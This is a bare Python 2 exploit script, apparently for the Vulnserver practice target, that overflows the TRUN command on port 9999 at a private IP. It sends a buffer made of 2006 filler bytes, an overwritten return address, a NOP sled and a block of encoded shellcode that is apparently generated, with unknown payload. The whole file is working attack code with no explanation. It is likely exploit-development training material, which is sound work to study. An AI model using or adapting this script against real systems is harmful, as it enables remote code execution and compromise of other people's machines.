#!/usr/bin/python
import socket
server = '192.168.1.33'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
exploit = (
"\xba\xd4\xf0\x7a\x04\xd9\xee\xd9\x74\x24\xf4\x5e\x33\xc9\xb1" +
"\x52\x31\x56\x12\x03\x56\x12\x83\x3a\x0c\x98\xf1\x3e\x05\xdf" +
"\xfa\xbe\xd6\x80\x73\x5b\xe7\x80\xe0\x28\x58\x31\x62\x7c\x55" +
"\xba\x26\x94\xee\xce\xee\x9b\x47\x64\xc9\x92\x58\xd5\x29\xb5" +
"\xda\x24\x7e\x15\xe2\xe6\x73\x54\x23\x1a\x79\x04\xfc\x50\x2c" +
"\xb8\x89\x2d\xed\x33\xc1\xa0\x75\xa0\x92\xc3\x54\x77\xa8\x9d" +
"\x76\x76\x7d\x96\x3e\x60\x62\x93\x89\x1b\x50\x6f\x08\xcd\xa8" +
"\x90\xa7\x30\x05\x63\xb9\x75\xa2\x9c\xcc\x8f\xd0\x21\xd7\x54" + 
"\xaa\xfd\x52\x4e\x0c\x75\xc4\xaa\xac\x5a\x93\x39\xa2\x17\xd7" +
"\x65\xa7\xa6\x34\x1e\xd3\x23\xbb\xf0\x55\x77\x98\xd4\x3e\x23" +
"\x81\x4d\x9b\x82\xbe\x8d\x44\x7a\x1b\xc6\x69\x6f\x16\x85\xe5" +
"\x5c\x1b\x35\xf6\xca\x2c\x46\xc4\x55\x87\xc0\x64\x1d\x01\x17" +
"\x8a\x34\xf5\x87\x75\xb7\x06\x8e\xb1\xe3\x56\xb8\x10\x8c\x3c" +
"\x38\x9c\x59\x92\x68\x32\x32\x53\xd8\xf2\xe2\x3b\x32\xfd\xdd" +
"\x5c\x3d\xd7\x75\xf6\xc4\xb0\xb9\xaf\xc7\x5b\x52\xb2\xc7\x5a" +
"\x19\x3b\x21\x36\x4d\x6a\xfa\xaf\xf4\x37\x70\x51\xf8\xed\xfd" +
"\x51\x72\x02\x02\x1f\x73\x6f\x10\xc8\x73\x3a\x4a\x5f\x8b\x90" +
"\xe2\x03\x1e\x7f\xf2\x4a\x03\x28\xa5\x1b\xf5\x21\x23\xb6\xac" +
"\x9b\x51\x4b\x28\xe3\xd1\x90\x89\xea\xd8\x55\xb5\xc8\xca\xa3" +
"\x36\x55\xbe\x7b\x61\x03\x68\x3a\xdb\xe5\xc2\x94\xb0\xaf\x82" +
"\x61\xfb\x6f\xd4\x6d\xd6\x19\x38\xdf\x8f\x5f\x47\xd0\x47\x68" +
"\x30\x0c\xf8\x97\xeb\x94\x18\x7a\x39\xe1\xb0\x23\xa8\x48\xdd" +
"\xd3\x07\x8e\xd8\x57\xad\x6f\x1f\x47\xc4\x6a\x5b\xcf\x35\x07" +
"\xf4\xba\x39\xb4\xf5\xee"
 
)
padding = 'F' * (3000 - 2006 - 4 - 16 - len(exploit))
attack = prefix + eip + nopsled + exploit + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
